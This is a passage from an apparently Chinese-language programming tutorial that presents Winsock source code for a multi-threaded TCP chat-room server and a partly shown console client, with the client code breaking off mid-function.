class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_THREAD 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUFF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line">SOCKET cntSockets[MAX_THREAD];<span class="comment">//所有连接的客户端socket</span></span><br><span class="line"><span class="type">int</span> cntCOUNT = <span class="number">0</span>;<span class="comment">//客户端数量</span></span><br><span class="line"></span><br><span class="line">HANDLE hMutex;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务端的设计：</span></span><br><span class="line"><span class="comment">// 1 每来一个连接，服务端起一个线程（安排一个工人）维护</span></span><br><span class="line"><span class="comment">// 2 将收到的消息转发给所有的客户端</span></span><br><span class="line"><span class="comment">// 3 某个连接断开，需要处理断开的连接</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">ThreadFUNC</span><span class="params">(<span class="type">void</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SendMsg</span><span class="params">(<span class="type">char</span>*, <span class="type">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Server begin:\n&quot;</span>);</span><br><span class="line">    <span class="comment">//加载套接字库</span></span><br><span class="line">    WORD wVersionRequested;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line"></span><br><span class="line">    wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 初始化套接字库</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//return err;</span></span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;WSAStartup() error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">1</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 创建套接字</span></span><br><span class="line">    SOCKET hServerSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hServerSock == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Creat socket ERROR&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SOCKADDR_IN addrServ;</span><br><span class="line">    <span class="type">int</span> szAddrServ = <span class="built_in">sizeof</span>(addrServ);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addrServ, <span class="number">0</span>, szAddrServ);</span><br><span class="line"></span><br><span class="line">    addrServ.sin_family = PF_INET;</span><br><span class="line">    addrServ.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">    addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">7000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//绑定</span></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(hServerSock, (sockaddr*)&amp;addrServ, szAddrServ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;bind ERROR&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//监听</span></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">listen</span>(hServerSock, <span class="number">5</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;listen ERROR&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Begin Listen:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    hMutex = <span class="built_in">CreateMutexW</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);<span class="comment">//创建互斥量</span></span><br><span class="line"></span><br><span class="line">    SOCKADDR_IN addrCnt;</span><br><span class="line">    <span class="type">int</span> szAddrCnt = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        SOCKET clientSock = <span class="built_in">accept</span>(hServerSock, (SOCKADDR*)&amp;addrCnt, &amp;szAddrCnt);</span><br><span class="line">        <span class="keyword">if</span> (SOCKET_ERROR == clientSock)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">ErrorHandling</span>(<span class="string">&quot;accept ERROR&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);</span><br><span class="line">        cntSockets[cntCOUNT++] = clientSock;</span><br><span class="line">        <span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line"></span><br><span class="line">        hThread = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFUNC, (<span class="type">void</span>*)&amp;clientSock, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connect client IP: %s \n&quot;</span>, <span class="built_in">inet_ntoa</span>(addrCnt.sin_addr));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connect client num: %d \n&quot;</span>, cntCOUNT);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">closesocket</span>(hServerSock);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">ThreadFUNC</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SOCKET clientSock = *(SOCKET*)(arg);</span><br><span class="line">    <span class="type">char</span> szMsg[MAX_BUFF_SIZE] = &#123;&#125;;</span><br><span class="line">    <span class="type">int</span> iLen = <span class="number">0</span>, i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        iLen = <span class="built_in">recv</span>(clientSock, szMsg, <span class="built_in">sizeof</span>(szMsg), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (iLen != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//将收到的消息转发给其他客户端</span></span><br><span class="line">            <span class="built_in">SendMsg</span>(szMsg, iLen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//处理客户端下线：因为用数组来表示客户端组，故有client离开时需要将后面的全部前移</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Current Connect NUM: %d&quot;</span>, cntCOUNT);</span><br><span class="line">    <span class="comment">//1 遍历找出下线client</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cntCOUNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cntSockets[i] == clientSock)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//2 移动数组</span></span><br><span class="line">            <span class="keyword">while</span> (i++ &lt; cntCOUNT)</span><br><span class="line">            &#123;</span><br><span class="line">                cntSockets[i<span class="number">-1</span>] = cntSockets[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//3 count-1</span></span><br><span class="line">    cntCOUNT--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Current Connect NUM: %d&quot;</span>, cntCOUNT);</span><br><span class="line">    <span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line">    <span class="comment">//4 close</span></span><br><span class="line">    <span class="built_in">closesocket</span>(clientSock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SendMsg</span><span class="params">(<span class="type">char</span>* message, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cntCOUNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">send</span>(cntSockets[i], message, len, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 基于当前系统的当前日期/时间</span></span><br><span class="line">    <span class="type">time_t</span> now = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">    tm* ltm = <span class="built_in">localtime</span>(&amp;now);</span><br><span class="line">    <span class="built_in">sprintf</span>(strtime, <span class="string">&quot;%2d:%2d:%2d&quot;</span>, ltm-&gt;tm_hour, ltm-&gt;tm_min, ltm-&gt;tm_sec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(message, stderr);</span><br><span class="line">    <span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="comment">//printf(&quot;Error num = %d, Error time %s\n&quot;, ::GetLastError(), ch);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error num = %d, Error time %s\n&quot;</span>, ERRNO, ch);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>📋客户端</p><ol><li>请求上线</li><li>发消息：等待用户从控制台输入，然后发送到服务端</li><li>客户端等待服务器消息，收完数据后输出控制台</li><li>等待用户关闭客户端【Q表示退出】</li></ol><p>其中，收发消息需要两个线程</p><ul><li>接收服务端的消息：一个线程接收消息</li><li>发送消息给服务端：一个线程发送消息</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_NameSize 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUFF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szName[MAX_NameSize] = <span class="string">&quot;[DEFAULT]&quot;</span>;<span class="comment">//上线名称</span></span><br><span class="line"><span class="type">char</span> szMsg[MAX_BUFF_SIZE];<span class="comment">//buffer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端的设计：</span></span><br><span class="line"><span class="comment">//1. 请求上线</span></span><br><span class="line"><span class="comment">//2. 发消息：等待用户从控制台输入</span></span><br><span class="line"><span class="comment">//3. 客户端等待服务器消息</span></span><br><span class="line"><span class="comment">//4. 等待用户关闭【Q表示退出】</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">SendThreadFUNC</span><span class="params">(<span class="type">void</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">RecvThreadFUNC</span><span class="params">(<span class="type">void</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dddddddddddddddddddddddddd:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Must input two args[Start in CMD]\n&quot;</span>);</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//szName = arg[1];//注意下面的写法</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Welcome &quot;</span> &lt;&lt; argv[<span class="number">1</span>]&lt;&lt;<span class="string">&quot;!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">sprintf</span>(szName, <span class="string">&quot;[%s]&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Client begin:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//加载套接字库</span></span><br><span class="line">    WORD wVersionRequested;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line"></span><br><span class="line">    wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 初始化套接字库</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//return err;</span></span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;WSAStartup() error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">1</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 创建套接字</span></span><br><span class="line">    SOCKET hSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSock == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Create socket ERROR&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SOCKADDR_IN addrCnt;</span><br><span class="line">    <span class="type">int</span> szAddrClient = <span class="built_in">sizeof</span>(addrCnt);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addrCnt, <span class="number">0</span>, szAddrClient);</span><br><span class="line"></span><br><span class="line">    addrCnt.sin_family = PF_INET;</span><br><span class="line">    addrCnt.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    addrCnt.sin_port = <span class="built_in">htons</span>(<span class="number">7000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3 connect 连接服务器</span></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(hSock, (SOCKADDR*)&amp;addrCnt, szAddrClient))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Connect ERROE&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Begin Send and Recv:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4 创建线程处理收发消息</span></span><br><span class="line">    HANDLE SendThread, RecvThread;</span><br><span class="line">    SendThread = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, SendThreadFUNC, (<span class="type">void</span>*)&amp;hSock, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    RecvThread = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, RecvThreadFUNC, (<span class="type">void</span>*)&amp;hSock, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5 等待线程执行结束</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(SendThread, INFINITE);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(RecvThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">closesocket</span>(hSock);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">SendThreadFUNC</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SOCKET hSock = *(SOCKET*)(arg);</span><br><span class="line">    <span class="type">char</span> szNameMsg[MAX_NameSize + MAX_BUFF_SIZE + <span class="number">1</span>] = &#123;&#125;;<span class="comment">//Name : Message</span></span><br><span class="line">    <span class="type">int</span> iLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(szMsg, <span class="number">0</span>, MAX_BUFF_SIZE);</span><br><span class="line">        <span class="built_in">memset</span>(szNameMsg, <span class="number">0</span>, MAX_NameSize + MAX_BUFF_SIZE + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 阻塞并等待输入消息</span></span><br><span class="line">        <span class="comment">//scanf(&quot;%s\n&quot;, szMsg);//报错</span></span><br><span class="line">        <span class="built_in">fgets</span>(szMsg, MAX_BUFF_SIZE, stdin);<span class="comment">//错误：无法终止输入</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 退出机制</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(szMsg, <span class="string">&quot;q\n&quot;</span>) || !<span class="built_in">strcmp</span>(szMsg, <span 